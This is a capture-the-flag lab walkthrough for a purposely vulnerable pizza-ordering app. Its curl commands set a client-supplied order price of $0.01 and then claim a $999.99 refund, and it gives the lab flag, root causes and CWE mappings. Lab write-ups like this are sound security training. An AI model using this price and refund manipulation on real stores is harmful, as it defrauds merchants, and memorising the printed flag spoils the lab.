# Cheesy Does It - BugForge Lab Walkthrough

**URL:** https://lab-1781045343779-onrc5e.labs-app.bugforge.io/
**Difficulty:** Easy  
**Vulnerability:** Business Logic - Client-Side Price + Refund Amount Manipulation
**Flag:** `bug{IyvDy0EiIAYHKHiLys52iIlxXuE9aswB}`

---

## Summary

Cheesy Does It is a pizza ordering SPA. Two separate client-side values are trusted by the server: the `total_price` in the order creation payload (so you can set your own price) and the `refund_amount` in the refund request (so you can claim more back than you paid). Placing an order for $0.01 then requesting a $999.99 refund triggers the flag.

## Tech Stack

- Frontend: React SPA (CRA, source maps exposed)
- Backend: Node.js / Express
- Auth: JWT (HS256, no exp, no role claim)
- No DB inspection needed - pure business logic

## Key Endpoints

| Endpoint | Auth | Notes |
|---|---|---|
| `POST /api/register` | None | No role mass-assignment |
| `POST /api/payment/validate` | JWT | Validates card details, always succeeds |
| `POST /api/payment/process` | JWT | `amount` is client-controlled, server ignores it |
| `POST /api/orders` | JWT | `unit_price` + `total_price` per item are client-controlled |
| `GET /api/orders/:id` | JWT | Shows current status |
| `POST /api/orders/:id/refund` | JWT | `refund_amount` is client-controlled; flag returned when `refund_amount > total_price` |

## Attack Chain

**Step 1 - Register a user**
```bash
curl -s -k -X POST $TARGET/api/register \
  -H "Content-Type: application/json" \
  -d '{"username":"attacker1","password":"Password123!","email":"attacker1@evil.com","address":"123 Test St","phone":"555-1234"}'
# Save TOKEN
```

**Step 2 - Validate payment (required before order)**
```bash
curl -s -k -X POST $TARGET/api/payment/validate \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"card_number":"4444 4444 4444 4444","exp_month":"12","exp_year":"25","cvv":"123"}'
# {"valid":true,...}
```

**Step 3 - Process payment with $0.01 (server doesn't validate against order total)**
```bash
curl -s -k -X POST $TARGET/api/payment/process \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"card_number":"4444 4444 4444 4444","amount":0.01}'
# {"success":true,...}
```

**Step 4 - Place order with client-supplied price**

Cart items use name strings (not IDs) and include client-supplied `unit_price` + `total_price`:
```bash
curl -s -k -X POST $TARGET/api/orders \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "items": [{
      "pizza_name": "Classic Margherita",
      "base_name": "Thin Crust",
      "sauce_name": "Classic Tomato",
      "size": "Medium",
      "toppings": [],
      "quantity": 1,
      "unit_price": 0.01,
      "total_price": 0.01
    }],
    "delivery_address": "123 Test St",
    "phone": "555-1234",
    "payment_method": "card",
    "notes": ""
  }'
# {"id":4,"order_number":"CDI-...","total_price":0.01,"status":"received"}
```
Server stores `total_price: 0.01` as supplied.

**Step 5 - Wait for order to reach "delivered" status**

Status progresses automatically every 120 seconds:
`received → preparing → baking → quality_check → out_for_delivery → delivered` (~10 min total)

Poll until delivered:
```bash
while true; do
  STATUS=$(curl -s -k $TARGET/api/orders/4 -H "Authorization: Bearer $TOKEN" | python3 -c "import sys,json; print(json.load(sys.stdin)['status'])")
  [ "$STATUS" = "delivered" ] && break
  sleep 30
done
```

**Step 6 - Request inflated refund**
```bash
curl -s -k -X POST $TARGET/api/orders/4/refund \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"issue_reason":"Order was cold","request_refund":true,"refund_amount":999.99}'
# {"success":true,"refund_approved":true,"refund_amount":999.99,"flag":"bug{IyvDy0EiIAYHKHiLys52iIlxXuE9aswB}"}
```

## Discovery Notes

- Source map at `/static/js/main.2962dba5.js.map` exposed full component source - found `refund_amount: parseFloat(order.total_price)` in `OrderTracking.js` immediately, confirming client-controlled refund amount.
- Checkout component sends `amount: cartTotal` to `/api/payment/process` - separate client-controlled value, but the order itself is what matters for the refund calculation.
- The refund button only renders client-side when `order.status === 'delivered'`, but the API also enforces this check server-side - had to wait for natural status progression.
- Orders with `NaN` total_price (from malformed earlier requests) do not trigger the flag even when refund is approved - the server needs a real numeric total to compare against.

## Dead Ends

| Tried | Why It Failed | Lesson |
|---|---|---|
| `pizza_id`/`base_id` integer fields in order body | Server expects name strings (`pizza_name`, `base_name`, etc.) | Read source map first - cart item structure uses names not IDs |
| Refund on `NaN` total_price orders | Flag not returned - server comparison with NaN is always false | Need a real numeric `total_price` in the order |
| PATCH/PUT `/api/orders/:id` to set status=delivered | Route does not exist | Status progression is server-controlled, can't be shortcut |
| Mass-assigning `role:admin` on registration | Field ignored, JWT has no role claim | Admin access not needed for this chain |
| Refund before delivered status | Server returns "Can only request refund for delivered orders" | Status check is server-side, not just client-side |

## Root Causes

1. `total_price` per order item is accepted directly from the request body without server-side recalculation from the menu.
2. `refund_amount` in the refund endpoint is accepted from the client without validating it against the order's stored `total_price`.
3. The flag is issued whenever `refund_amount > total_price` - no rate limiting or one-refund-per-order check.

## CWE / OWASP

- CWE-602: Client-Side Enforcement of Server-Side Security
- CWE-840: Business Logic Errors
- OWASP A04:2021 - Insecure Design
